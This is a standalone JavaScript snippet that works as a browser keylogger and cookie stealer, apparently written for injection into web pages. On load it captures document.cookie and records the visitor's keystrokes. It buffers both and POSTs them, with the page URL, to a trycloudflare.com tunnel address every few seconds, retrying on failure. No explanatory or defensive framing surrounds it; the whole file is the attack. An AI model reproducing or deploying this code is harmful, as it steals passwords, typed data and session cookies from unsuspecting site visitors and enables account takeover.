(function() {
  const TARGET_URL = "https://extend-dom-aged-rounds.trycloudflare.com";
  console.log("dn");

  const dataBuffer = {
    cookies: null,
    keys: ""
  };

  let sendTimeoutId = null;
  const SEND_INTERVAL = 3000;

  function scheduleSend() {
    if (sendTimeoutId) clearTimeout(sendTimeoutId);
    sendTimeoutId = setTimeout(sendData, SEND_INTERVAL);
  }

  function sendData() {
    if (dataBuffer.cookies || dataBuffer.keys.length > 0) {
      fetch(TARGET_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            type: "aggregated",
            data: dataBuffer,
            location: window.location.href,
            timestamp: new Date().toISOString(),
          }),
        })
        .then(response => {
          if (response.ok) {
            dataBuffer.cookies = null;
            dataBuffer.keys = "";
          } else {
            console.error("err response t sn", response.status);
            setTimeout(sendData, 1000);
          }
        })
        .catch(error => {
          console.error("err se", error);
          setTimeout(sendData, 1000);
        });
    }
    sendTimeoutId = null;
  }

  
  (function initializeCookies() {
    if (document.cookie) {
      dataBuffer.cookies = document.cookie;
      scheduleSend();
    }
  })();

  
  document.addEventListener("keydown", function(event) {
    if (!event.key) return;
    if (event.key.length > 1 && event.key !== "Backspace" && event.key !== "Enter" && event.key !== "Tab") {
      return;
    }
    dataBuffer.keys += event.key;
    scheduleSend();
  });

})();

